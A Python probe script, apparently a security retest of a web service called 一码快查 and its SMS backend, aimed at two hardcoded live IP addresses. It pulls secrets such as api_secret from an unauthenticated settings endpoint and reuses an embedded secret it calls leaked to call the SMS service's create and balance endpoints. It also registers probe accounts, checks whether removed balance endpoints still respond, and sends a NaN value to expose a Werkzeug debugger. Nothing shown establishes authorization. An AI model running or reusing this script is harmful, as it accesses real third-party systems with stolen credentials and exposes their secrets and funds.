#!/usr/bin/env python3
"""一码快查更新后站点复测探测（2026-07-07）"""
from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

MAIN = "http://43.154.128.116:9110"
SMS = "http://47.76.163.227:8081"
LEGACY_SMS_SECRET = "18cdfb81a4e44a3a915528e67d923dba"


def req(method: str, url: str, payload: dict | None = None) -> tuple[int, str]:
    data = json.dumps(payload).encode() if payload is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    r = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(r, timeout=12) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def ok(msg: str) -> None:
    print(f"[+] {msg}")


def info(msg: str) -> None:
    print(f"[.] {msg}")


def warn(msg: str) -> None:
    print(f"[!] {msg}")


def main() -> int:
    print("=== 一码快查 更新后复测 ===\n")

    # 1. 9110 存活
    code, body = req("GET", f"{MAIN}/login")
    if code != 200:
        warn(f"9110 不可达: {code}")
        return 1
    ok(f"9110 在线 ({code})")

    # 2. settings 泄露
    for key in ("api_secret", "api_domain", "deduct_amount", "contact_link"):
        code, body = req("GET", f"{MAIN}/api/desktop/settings?key={key}")
        if '"ok":true' in body and '"value":""' not in body:
            val = json.loads(body).get("value", "")
            ok(f"settings 泄露 {key} = {val[:60]}")
        else:
            info(f"settings {key} 空或失败")

    # 3. 已删除接口
    removed = [
        "/api/desktop/refund-balance",
        "/api/desktop/decrease-balance",
        "/api/desktop/card-recharge",
    ]
    for path in removed:
        code, body = req("POST", f"{MAIN}{path}", {"username": "x", "amount": 1})
        if code == 404:
            ok(f"已移除 {path}")
        else:
            warn(f"{path} 仍存在? {code} {body[:80]}")

    # 4. 新鉴权：register + login + token user-info
    user = f"probe_{int(time.time())}"
    code, body = req("POST", f"{MAIN}/api/desktop/register", {"username": user, "password": "probe123"})
    if '"ok":true' not in body:
        warn(f"注册失败: {body}")
        return 1
    ok(f"注册成功 {user}")

    code, body = req("POST", f"{MAIN}/api/desktop/login", {"username": user, "password": "probe123"})
    login = json.loads(body)
    if not login.get("ok") or not login.get("token"):
        warn(f"登录失败: {body}")
        return 1
    token = login["token"]
    ok(f"登录返回 token，status={login.get('user', {}).get('status')}")

    code, body = req("GET", f"{MAIN}/api/desktop/user-info?username={user}")
    if "missing auth" in body:
        ok("user-info 无 token 被拒绝")
    code, body = req("GET", f"{MAIN}/api/desktop/user-info?username={user}&token={token}")
    if '"ok":true' in body:
        ok(f"user-info 需 token: {body[:100]}")

    # 5. 8081 旧 secret 与 settings secret
    code, settings_body = req("GET", f"{MAIN}/api/desktop/settings?key=api_secret")
    settings_secret = json.loads(settings_body).get("value", "")

    code, body = req("POST", f"{SMS}/create/{LEGACY_SMS_SECRET}", {"area": "86", "data": "17300000999", "islink": False})
    if '"code":0' in body:
        warn(f"旧泄露 secret 仍可用于 8081 create: {body[:100]}")
    else:
        info(f"旧 secret create: {body[:80]}")

    code, body = req("POST", f"{SMS}/create/{settings_secret}", {"area": "86", "data": "17300000998", "islink": False})
    if "无效Token" in body:
        ok("settings 中的 api_secret 在 8081 无效（已轮换/脱钩）")
    else:
        warn(f"settings secret 可用? {body[:80]}")

    # 6. 新接口 balance
    code, body = req("GET", f"{SMS}/balance/{LEGACY_SMS_SECRET}")
    if code == 200 and body and "无效" not in body:
        warn(f"8081 新接口 /balance 泄露运营余额: {body}")
    else:
        info(f"/balance legacy: {code} {body[:60]}")

    # 7. admin/debugger
    code, body = req("POST", f"{MAIN}/api/desktop/decrease-balance", {"username": "x", "amount": "NaN"})
    if "Werkzeug Debugger" in body:
        warn("Werkzeug Debugger 仍暴露")
    else:
        ok("Debugger 触发路径已不可用")

    code, _ = req("GET", f"{MAIN}/admin/users")
    if code == 403:
        ok("admin 页面返回 403（加固）")

    print("\n=== 完成 ===")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
